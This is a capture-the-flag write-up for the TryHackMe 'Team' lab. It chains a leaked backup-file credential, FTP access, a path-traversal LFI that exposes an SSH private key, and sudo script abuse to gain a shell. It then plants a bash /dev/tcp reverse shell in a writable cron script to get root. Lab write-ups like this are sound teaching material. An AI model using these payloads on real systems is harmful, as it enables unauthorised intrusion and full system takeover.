# TryHackMe - Team

**Platform:** TryHackMe
**Category:** Web Enumeration / Credential Exposure / Linux Privilege Escalation
**Difficulty:** Easy-Medium

## Summary

This room simulates a small internal "team site" that leaks credentials
through a forgotten backup file, then chains that access into SSH, sudo
misuse, and a writable cron script to escalate to root. It's a good example
of how a handful of small, individually "minor" misconfigurations, in this
case a forgotten `.old` file, can add up to a major impact: full root
access. Every step in this chain would have left a distinct trail in logs,
which I've noted throughout.

## Tools Used

- `dirsearch` for initial directory enumeration
- `ffuf` for targeted fuzzing on the `/scripts/` path
- `ftp` for retrieving files from an exposed FTP share
- Browser LFI (`script.php?page=`) for reading local files off the dev vhost
- `ssh` for authenticating with a recovered private key
- `python3 pty.spawn` for shell stabilization
- `nc` (netcat) for catching a reverse shell
- `nano` for editing the writable cron script

## Objective

Enumerate a web application, recover leaked credentials, pivot across two
vhosts, and escalate from an unprivileged user to root.

## Set-up

If you're using the TryHackMe AttackBox, you can skip this section.
Otherwise, to interact with the machine you'll need to install OpenVPN from
[tryhackme.com/access](https://tryhackme.com/access) and follow the steps to
connect. Then, get the IP of the lab machine and add it to your
`/etc/hosts` file:

![Setting up /etc/hosts](./screenshots/1.png)
![Confirming the host entry resolves](./screenshots/2.png)

## Process

### 1. Initial Recon

We start by looking for directories inside `http://team.thm/`:

```bash
dirsearch -u http://team.thm/ -w Filenames_or_Directories_Common.wordlist -e php
```

This turns up the following directories:

![dirsearch results showing /images, /assets, /scripts, and robots.txt](./screenshots/4.png)

`robots.txt` contains only the word "dale", likely a username, worth
keeping in mind for later.

![robots.txt containing the username "dale"](./screenshots/5.png)

### 2. Fuzzing the Scripts Directory

Of the directories found, `/scripts/` is the most interesting.
`/images/` and `/assets/` are unlikely to hold anything actionable. Fuzzing
it directly:

```bash
ffuf -u 'http://team.thm/scripts/FUZZ' -w Filenames_or_Directories_Common.wordlist -e .bak,.txt,.zip -mc 200,403
```

Everything comes back 403 (blocked) except `script.txt`. Reading it:

![Contents of script.txt](./screenshots/7.png)

A comment in the file hints at a `script.old`. Requesting
`http://team.thm/scripts/script.old` downloads the file, but it isn't
directly viewable until renamed to `script.txt` locally. Once renamed, it
turns out to be an older version of the script, this one including
credentials for an FTP account.

### 3. Accessing FTP

Using the recovered credentials:

```bash
ftp
open
team.thm
[username]
[password]
```

![Logging into FTP](./screenshots/9.png)

One thing to note: the directory you're running these commands from
matters. If `get` doesn't work on a file you're trying to pull, try moving
up a directory (`cd ..`) before reconnecting.

### 4. Retrieving the File

Inside the FTP session, navigating with `ls` and `cd` eventually surfaces
`New_site.txt`:

```bash
get New_site.txt
```

![Downloading New_site.txt via FTP](./screenshots/10.png)

Reading the file:

![Contents of New_site.txt](./screenshots/11.png)

It hints at a subdomain, `dev.team.thm`, which is where we'll focus recon
next. Before visiting it, add it to `/etc/hosts` the same way as during
setup:

<p align="center">
  <img src="./screenshots/12.png" alt="Adding dev.team.thm to /etc/hosts">
  <br>
  <em>The IP differs from the setup screenshot since this one was taken on a separate day.</em>
</p>

### 5. The Dev Subdomain

Inside `dev.team.thm`, there's a placeholder link for a "teamshare", pointing
to `http://dev.team.thm/script.php?page=teamshare.php`.

The `page` parameter is worth investigating on its own. Fuzzing after the
`=` with a wordlist geared toward LFI turns up `../../../etc/ssh/sshd_config`,
reachable at: http://dev.team.thm/script.php?page=../../../etc/ssh/sshd_config

This file contains an SSH key.

![sshd_config leaking an SSH private key via LFI](./screenshots/13_.png)

### 6. Recovering the SSH Key

Create a local file with the key contents, starting from
`-----BEGIN OPENSSH PRIVATE KEY-----` down to
`-----END OPENSSH PRIVATE KEY-----`, and strip out the leading `#` on each
line. The result should look like this:

![Cleaned-up SSH private key file](./screenshots/14_.png)

### 7. SSH Access and First Flag

Keeping in mind which directory you're running from, connect with:

```bash
ssh -i [SSH file name] dale@team.thm
```

This gives access to dale's files. Navigating them turns up the first flag
in `user.txt`.

![First flag in user.txt](./screenshots/16.png)

### 8. Privilege Escalation

Scouring the filesystem turns up a user, gyles, at `/home/gyles/`,
containing a single file named `admin_checks`. The same thing can be found
with:

```bash
sudo -l
```

Printing `admin_checks` shows the following:

![Contents of admin_checks](./screenshots/17.png)

The script looks like it's meant to be run with `sudo -u`, so:

```bash
sudo -u gyles /home/gyles/admin_checks
```

It prompts for credentials and a date. Systems like this are often
misconfigured badly enough that supplying `/bin/sh` at any of the prompts
spawns a shell instead of requiring the actual credentials:

![Spawning a shell via admin_checks misconfiguration](./screenshots/18.png)

### 9. Setting Up the Reverse Shell

Spawn an interactive shell while on gyles:

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```

![Spawning an interactive shell](./screenshots/19.png)

Navigating to `/home/gyles` and running `ls -la` reveals a `.bash_history`
file. Reading through it carefully turns up a `nano` command targeting
`/usr/local/bin/main_backup.sh`, which ends up being the path to root.

Printing the file shows it's badly exposed. Replacing the line
`cp -r /var/www/team.thm/* /var/backups/www/team.thm/` with a Pentest Monkey
bash reverse shell gets us a shell as whoever runs the script:

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Replace the IP with the one TryHackMe assigned when connecting to the VPN.

![Replacing main_backup.sh with a reverse shell payload](./screenshots/20.png)

### 10. Catching the Shell and Root, Flag Two

After editing `main_backup.sh`, open a separate terminal and listen:

```bash
nc -lvnp 8080
```

Give it some time. Once the scheduled job runs the script, the shell
connects back. Navigate with `ls` and you'll find `root.txt`, the second
flag. :)
